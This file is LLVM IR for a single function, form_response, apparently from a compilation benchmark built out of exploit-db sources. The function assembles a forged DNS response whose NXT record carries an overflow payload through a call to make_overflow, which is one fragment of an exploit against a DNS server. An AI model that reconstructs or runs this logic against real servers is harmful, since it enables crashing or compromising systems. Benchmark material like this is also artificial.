; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_19615.c_form_response.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/dos/extr_19615.c_form_response.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { i32 }
%struct.TYPE_4__ = type { i32, i32, i64, i8*, i8*, i8*, i32 }

@.str = private unnamed_addr constant [12 x i8] c"%s type=%d\0A\00", align 1
@T_A = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"%c%c%c%c\00", align 1
@T_NXT = common dso_local global i32 0, align 4
@archlist = common dso_local global %struct.TYPE_5__* null, align 8
@arch = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [7 x i8] c"admadm\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @form_response(%struct.TYPE_4__* %0, i8* %1) #0 {
  %3 = alloca %struct.TYPE_4__*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [512 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca %struct.TYPE_4__*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  store %struct.TYPE_4__* %0, %struct.TYPE_4__** %3, align 8
  store i8* %1, i8** %4, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i32 @memset(i8* %10, i32 0, i32 8)
  %12 = load i8*, i8** %4, align 8
  %13 = bitcast i8* %12 to %struct.TYPE_4__*
  store %struct.TYPE_4__* %13, %struct.TYPE_4__** %7, align 8
  %14 = load %struct.TYPE_4__*, %struct.TYPE_4__** %3, align 8
  %15 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %14, i32 0, i32 6
  %16 = load i32, i32* %15, align 8
  %17 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %18 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %17, i32 0, i32 6
  store i32 %16, i32* %18, align 8
  %19 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %20 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %19, i32 0, i32 0
  store i32 1, i32* %20, align 8
  %21 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %22 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %21, i32 0, i32 1
  store i32 1, i32* %22, align 4
  %23 = call i8* @htons(i32 1)
  %24 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %24, i32 0, i32 5
  store i8* %23, i8** %25, align 8
  %26 = call i8* @htons(i32 1)
  %27 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %28 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %27, i32 0, i32 4
  store i8* %26, i8** %28, align 8
  %29 = call i8* @htons(i32 1)
  %30 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %31 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %30, i32 0, i32 3
  store i8* %29, i8** %31, align 8
  %32 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %32, i32 0, i32 2
  store i64 0, i64* %33, align 8
  %34 = load %struct.TYPE_4__*, %struct.TYPE_4__** %7, align 8
  %35 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %34, i64 1
  %36 = bitcast %struct.TYPE_4__* %35 to i8*
  store i8* %36, i8** %9, align 8
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %38 = load %struct.TYPE_4__*, %struct.TYPE_4__** %3, align 8
  %39 = bitcast %struct.TYPE_4__* %38 to i8*
  %40 = load %struct.TYPE_4__*, %struct.TYPE_4__** %3, align 8
  %41 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %40, i64 1
  %42 = bitcast %struct.TYPE_4__* %41 to i8*
  %43 = call i8* @dnssprintflabel(i8* %37, i8* %39, i8* %42)
  store i8* %43, i8** %8, align 8
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %45 = call i32 @strlen(i8* %44)
  %46 = sub nsw i32 %45, 1
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %47
  store i8 0, i8* %48, align 1
  %49 = load i8*, i8** %8, align 8
  %50 = bitcast i8* %49 to i16*
  %51 = load i16, i16* %50, align 2
  %52 = zext i16 %51 to i32
  store i32 %52, i32* %6, align 4
  %53 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %54 = load i32, i32* %6, align 4
  %55 = call i32 @ntohs(i32 %54)
  %56 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i8* %53, i32 %55)
  %57 = load i8*, i8** %9, align 8
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %59 = call i8* @dnsaddlabel(i8* %57, i8* %58)
  store i8* %59, i8** %9, align 8
  %60 = load i32, i32* %6, align 4
  %61 = call i32 @ntohs(i32 %60)
  %62 = load i8*, i8** %9, align 8
  %63 = call i32 @PUTSHORT(i32 %61, i8* %62)
  %64 = load i8*, i8** %9, align 8
  %65 = call i32 @PUTSHORT(i32 1, i8* %64)
  %66 = load i8*, i8** %9, align 8
  %67 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %68 = call i8* @dnsaddlabel(i8* %66, i8* %67)
  store i8* %68, i8** %9, align 8
  %69 = load i32, i32* @T_A, align 4
  %70 = load i8*, i8** %9, align 8
  %71 = call i32 @PUTSHORT(i32 %69, i8* %70)
  %72 = load i8*, i8** %9, align 8
  %73 = call i32 @PUTSHORT(i32 1, i8* %72)
  %74 = load i8*, i8** %9, align 8
  %75 = call i32 @PUTLONG(i32 300, i8* %74)
  %76 = load i8*, i8** %9, align 8
  %77 = call i32 @PUTSHORT(i32 4, i8* %76)
  %78 = load i8*, i8** %9, align 8
  %79 = call i32 (i8*, i8*, ...) @sprintf(i8* %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i32 1, i32 2, i32 3, i32 4)
  %80 = load i8*, i8** %9, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 4
  store i8* %81, i8** %9, align 8
  %82 = load i8*, i8** %9, align 8
  %83 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %84 = call i8* @dnsaddlabel(i8* %82, i8* %83)
  store i8* %84, i8** %9, align 8
  %85 = load i32, i32* @T_NXT, align 4
  %86 = load i8*, i8** %9, align 8
  %87 = call i32 @PUTSHORT(i32 %85, i8* %86)
  %88 = load i8*, i8** %9, align 8
  %89 = call i32 @PUTSHORT(i32 1, i8* %88)
  %90 = load i8*, i8** %9, align 8
  %91 = call i32 @PUTLONG(i32 300, i8* %90)
  %92 = load %struct.TYPE_5__*, %struct.TYPE_5__** @archlist, align 8
  %93 = load i64, i64* @arch, align 8
  %94 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %92, i64 %93
  %95 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 4
  %97 = add nsw i32 %96, 7
  %98 = load i8*, i8** %9, align 8
  %99 = call i32 @PUTSHORT(i32 %97, i8* %98)
  %100 = load i8*, i8** %9, align 8
  %101 = call i32 @PUTSHORT(i32 6, i8* %100)
  %102 = load i8*, i8** %9, align 8
  %103 = call i32 (i8*, i8*, ...) @sprintf(i8* %102, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %104 = load i8*, i8** %9, align 8
  %105 = getelementptr inbounds i8, i8* %104, i64 6
  store i8* %105, i8** %9, align 8
  %106 = load i8*, i8** %9, align 8
  %107 = call i32 @PUTSHORT(i32 0, i8* %106)
  %108 = load i8*, i8** %9, align 8
  %109 = call i32 @make_overflow(i8* %108)
  %110 = load %struct.TYPE_5__*, %struct.TYPE_5__** @archlist, align 8
  %111 = load i64, i64* @arch, align 8
  %112 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %110, i64 %111
  %113 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %112, i32 0, i32 0
  %114 = load i32, i32* %113, align 4
  %115 = load i8*, i8** %9, align 8
  %116 = sext i32 %114 to i64
  %117 = getelementptr inbounds i8, i8* %115, i64 %116
  store i8* %117, i8** %9, align 8
  %118 = load i8*, i8** %9, align 8
  %119 = call i32 @PUTSHORT(i32 0, i8* %118)
  %120 = load i8*, i8** %9, align 8
  %121 = load i8*, i8** %4, align 8
  %122 = ptrtoint i8* %120 to i64
  %123 = ptrtoint i8* %121 to i64
  %124 = sub i64 %122, %123
  %125 = trunc i64 %124 to i32
  ret i32 %125
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @dnssprintflabel(i8*, i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i8*, i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i8* @dnsaddlabel(i8*, i8*) #1

declare dso_local i32 @PUTSHORT(i32, i8*) #1

declare dso_local i32 @PUTLONG(i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @make_overflow(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
